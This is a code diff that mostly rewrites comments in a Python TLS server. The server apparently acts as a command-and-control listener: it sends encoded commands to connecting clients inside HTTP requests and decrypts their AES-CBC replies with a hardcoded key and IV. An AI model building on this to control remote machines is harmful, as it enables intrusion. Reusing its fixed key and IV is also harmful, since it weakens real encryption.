@@ -14,7 +14,7 @@ aes_key = bytes([0x2b, 0x7e, 0x15, 0x16, 0x28, 0x6d, 0x29, 0x58, 0x41, 0x60, 0x7
 aes_iv = bytes([0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f])  # IV from C program
 
 def decrypt_aes_cbc(encrypted_hex):
-    """Decrypt the AES CBC encrypted data (hex) back to plaintext."""
+    """Decrypt AES-CBC encrypted hex data into plaintext."""
     try:
         encrypted_data = binascii.unhexlify(encrypted_hex)  # Convert hex to bytes
         cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)  # Create AES cipher
@@ -22,14 +22,14 @@ def decrypt_aes_cbc(encrypted_hex):
         return decrypted_data.rstrip(b'\x00').decode('utf-8')  # Remove padding and decode to string
     except Exception as e:
         return f"Decryption error: {e}"
-        
+
 def pad(data):
-    """Pad data to be a multiple of AES block size."""
+    """Add PKCS7 padding to data to align with AES block size."""
     padding_length = AES.block_size - len(data) % AES.block_size
     return data + bytes([padding_length] * padding_length)  # Add padding
 
 def unpad(data):
-    """Remove padding from data (PKCS7)."""
+    """Remove PKCS7 padding from data."""
     padding_length = data[-1]
     if padding_length < 1 or padding_length > AES.block_size:
         raise ValueError("Invalid padding length")
@@ -41,24 +41,24 @@ def unpad(data):
     return data[:-padding_length]  # Remove the padding
 
 def encrypt_aes_cbc(plaintext):
-    """Encrypt the plaintext using AES-CBC."""
+    """Encrypt plaintext using AES-CBC mode."""
     try:
-        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)
-        padded_plaintext = pad(plaintext.encode())
-        encrypted_data = cipher.encrypt(padded_plaintext)
+        cipher = AES.new(aes_key, AES.MODE_CBC, aes_iv)  # Create AES cipher
+        padded_plaintext = pad(plaintext.encode())  # Add padding
+        encrypted_data = cipher.encrypt(padded_plaintext)  # Encrypt
         return binascii.hexlify(encrypted_data).decode()  # Convert to hex string
     except Exception as e:
         return f"Encryption error: {e}"
 
 def extract_body_from_response(response):
-    """Extract the body from the HTTP response."""
-    body_start = response.find('\r\n\r\n')
+    """Extract the body content from an HTTP response."""
+    body_start = response.find('\r\n\r\n')  # Locate the start of the body
     if body_start != -1:
-        return response[body_start + 4:]
+        return response[body_start + 4:]  # Extract content after headers
     return None
 
 def receive_full_response(conn):
-    """Receive the full response from the server based on Content-Length."""
+    """Receive and reconstruct a full HTTP response based on Content-Length."""
     response_data = b""
     
     # Read the header to determine Content-Length
@@ -68,7 +68,7 @@ def receive_full_response(conn):
             break
         response_data += chunk
 
-    headers, body = response_data.split(b"\r\n\r\n", 1)
+    headers, body = response_data.split(b"\r\n\r\n", 1)  # Split headers and body
     headers_str = headers.decode('utf-8', errors='ignore')
 
     # Parse Content-Length
@@ -86,20 +86,21 @@ def receive_full_response(conn):
         body += chunk
 
     return headers.decode('utf-8', errors='ignore') + "\r\n\r\n" + body.decode('utf-8', errors='ignore')
-    
+
 def start_server():
+    """Start an SSL/TLS server and handle client connections."""
     context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
     context.load_cert_chain(certfile=certfile, keyfile=keyfile)
 
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
-        sock.bind((host, port))
-        sock.listen(5)
+        sock.bind((host, port))  # Bind to the specified host and port
+        sock.listen(5)  # Start listening for connections
 
         with context.wrap_socket(sock, server_side=True) as ssock:
             print(f"[*] Listening on {host}:{port}")
 
             while True:
-                conn, addr = ssock.accept()
+                conn, addr = ssock.accept()  # Accept a new connection
                 print(f"[+] Connection from {addr}")
 
                 try:
@@ -125,22 +126,21 @@ def start_server():
                             f"Content-Type: application/x-www-form-urlencoded\r\n"
                             f"Content-Length: 0\r\n\r\n"
                         )
-                        conn.sendall(http_request.encode())
-                        print(f"[+] Sent command: {encoded_command}")
+                        conn.sendall(http_request.encode())  # Send the HTTP request
 
                         response = receive_full_response(conn)  # Receive full response
                         print(f"[+] Received response:\n{response}")
 
-                        body = extract_body_from_response(response)
+                        body = extract_body_from_response(response)  # Extract response body
                         if body:
-                            decrypted_response = decrypt_aes_cbc(body)
+                            decrypted_response = decrypt_aes_cbc(body)  # Decrypt the body
                             print(f"[+] Decrypted response:\n{decrypted_response}")
                         else:
                             print("[-] No body found in response.")
                 except Exception as e:
                     print(f"[-] Error: {e}")
                 finally:
-                    conn.close()
+                    conn.close()  # Close the connection
 
 if __name__ == "__main__":
     start_server()
